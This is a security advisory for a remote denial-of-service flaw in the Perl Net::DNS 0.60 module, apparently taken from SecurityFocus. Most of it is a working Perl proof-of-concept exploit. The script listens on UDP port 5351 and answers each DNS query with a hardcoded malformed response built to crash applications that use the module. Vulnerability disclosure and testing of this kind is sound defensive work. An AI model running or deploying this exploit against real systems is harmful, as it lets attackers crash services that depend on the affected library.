source: http://www.securityfocus.com/bid/26902/info

The Perl Net::DNS module is prone to a remote denial-of-service vulnerability because the module fails to properly handle malformed DNS responses.

Successfully exploiting this issue allows attackers to crash applications that use the affected module.

Net::DNS 0.60 is vulnerable; other versions may also be affected.

#!/usr/bin/perl
# Beyond Security(c)
# Vulnerability found by beSTORM - DNS Server module

use strict;
use IO::Socket;
my($sock, $oldmsg, $newmsg, $hisaddr, $hishost, $MAXLEN, $PORTNO);
$MAXLEN = 1024;
$PORTNO = 5351;
$sock = IO::Socket::INET->new(LocalPort => $PORTNO, Proto => 'udp') or die "socket: $@";
print "Awaiting UDP messages on port $PORTNO\n";

my $oldmsg = "\x5a\x40\x81\x80\x00\x01\x00\x01\x00\x01\x00\x01\x07\x63\x72\x61".
"\x63\x6b\x6d\x65\x0a\x6d\x61\x73\x74\x65\x72\x63\x61\x72\x64\x03".
"\x63\x6f\x6d\x00\x00\x01\x00\x01\x03\x77\x77\x77\x0e\x62\x65\x79".
"\x6f\x6e\x64\x73\x65\x63\x75\x72\x69\x74\x79\x03\x63\x6f\x6d\x00".
"\x00\x01\x00\x01\x00\x00\x00\x01\x00\x04\xc0\xa8\x01\x02\x0e\x62".
"\x65\x79\x6f\x6e\x64\x73\x65\x63\x75\x72\x69\x74\x79\x03\x63\x6f".
"\x6d\x00\x00\x02\x00\x01\x00\x00\x00\x01\x00\x1b\x02\x6e\x73\x03".
"\x77\x77\x77\x0e\x62\x65\x79\x6f\x6e\x64\x73\x65\x63\x75\x72\x69".
"\x74\x79\x03\x63\x6f\x6d\x00\x02\x6e\x73\x0e\x62\x65\x79\x6f\x6e".
"\x64\x73\x65\x63\x75\x72\x69\x74\x79\x03\x63\x6f\x6d\x00\x00\x01".
"\x00\x01\x00\x00\x00\x01\x00\x01\x41";
while ($sock->recv($newmsg, $MAXLEN)) {
 my($port, $ipaddr) = sockaddr_in($sock->peername);
 $hishost = gethostbyaddr($ipaddr, AF_INET);
 print "Client $hishost said ``$newmsg''\n";
 $sock->send($oldmsg);
 $oldmsg = "[$hishost] $newmsg";
}
die "recv: $!";